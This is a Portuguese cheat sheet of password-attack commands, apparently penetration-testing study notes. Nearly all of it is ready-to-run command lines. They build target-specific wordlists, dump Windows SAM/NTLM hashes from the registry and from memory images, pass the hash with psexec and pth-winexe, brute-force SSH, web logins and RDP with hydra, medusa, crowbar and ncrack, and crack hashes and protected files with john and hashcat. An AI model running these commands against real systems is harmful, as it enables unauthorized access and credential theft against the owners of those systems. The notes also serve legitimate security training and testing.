# 8. Ataques a Senhas

### 8.1 Preparar wordlists
```bash
hash-identifier                                   # identificar hash
crunch 6 6 0123456789ABCDEF -o list.txt           # 6 dígitos hex
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha -o mixed.txt
cewl www.megacorpone.com -m 6 -w cewl.txt         # a partir do site
cewl -d 5 -m 3 --with-numbers -w cewl.txt http://$IP/   # profundidade + números
cupp -i                                           # wordlist alvo-específica (nome, pet, datas)
john --wordlist=cewl.txt --rules --stdout > mutated.txt   # mutar (john.conf)
```

### 8.2 Hashes do Windows (SAM / NTLM)
- **SAM**: `C:\Windows\System32\config\SAM`; hashes LM/NTLM. Formato: `user:rid:LMhash:NThash:::`.
- **Net-NTLMv1/v2**: autenticação de rede (challenge/response) — dá para crackear/relay, **não** dá para pass-the-hash.
```bash
# Dump via registro:
reg save hklm\sam c:\sam; reg save hklm\system c:\system
secretsdump.py -sam SAM -system SYSTEM LOCAL
# a partir de memory dump (volatility):
volatility imageinfo -f mem.raw
volatility hivelist -f mem.raw --profile=Win7SP1x86
volatility hashdump -f mem.raw --profile=Win7SP1x86 -y <sys> -s <sam> > hashes.txt
# pwdump / fgdump / WCE (em memória)
pwdump SYSTEM SAM
```

### 8.3 Pass-the-Hash
```bash
export SMBHASH=aad3b435...:e0fb1fb85756...
pth-winexe -U administrator%$SMBHASH //$IP cmd
psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 htb/administrator@$IP cmd.exe
```

### 8.4 Brute force online
```bash
hydra -l <user> -P rockyou.txt $IP ssh -t 4
hydra -L users.txt -P pass.txt $IP http-post-form "/login:username=^USER^&password=^PASS^&Login=Login:<msg de falha>"
medusa -h $IP -u admin -P pass.txt -M http -m DIR:/admin -T 20
crowbar -b rdp -s $IP/32 -u admin -C pass.txt -n 1
ncrack -v -f --user administrator -P pass.txt rdp://$IP,CL=1
```

### 8.5 Cracking offline
```bash
john hashes.txt
john --format=nt hash.txt --wordlist=rockyou.txt
unshadow passwd shadow > unshadowed.txt
python /usr/share/john/ssh2john.py id_rsa > id.hash && john --wordlist=rockyou.txt id.hash
fcrackzip -v -u -D -p rockyou.txt file.zip
```
**Hashcat por tipo**:
```bash
hashcat -m 3000 hash.txt rockyou.txt      # LM
hashcat -m 1000 hash.txt rockyou.txt      # NTLM (NT)
hashcat -m 5500 hash.txt rockyou.txt      # NetNTLMv1
hashcat -m 5600 hash.txt rockyou.txt      # NetNTLMv2
hashcat -m 500  hash.txt rockyou.txt      # md5crypt ($1$)
hashcat -m 1800 hash.txt rockyou.txt      # sha512crypt ($6$)
hashcat -m 13100 hash.txt rockyou.txt     # Kerberoast (TGS-REP)
hashcat -m 18200 hash.txt rockyou.txt     # AS-REP Roast
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule  # com regras
```
**Arquivos protegidos** (zip/rar/ssh/office → john):
```bash
zip2john file.zip > z.hash && john z.hash --wordlist=rockyou.txt   # ssh2john / office2john / rar2john
john --show z.hash
```
Online: crackstation.net · hashkiller · cracker.offensive-security.com
